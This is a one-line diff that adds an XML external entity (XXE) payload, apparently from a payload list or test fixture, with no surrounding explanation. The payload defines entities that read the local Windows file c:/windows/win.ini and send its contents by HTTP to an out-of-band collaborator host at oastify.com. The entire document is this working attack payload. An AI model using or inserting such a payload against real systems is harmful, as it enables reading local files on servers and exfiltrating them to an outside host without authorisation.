@@ -1,0 +1,1 @@
+<!ENTITY % file SYSTEM "file:///c:/windows/win.ini"> <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://jaxzug74dme6k1qmbs1z5vuphgn9b06ov.oastify.com/?x=%file;'>"> %eval; %exfiltrate
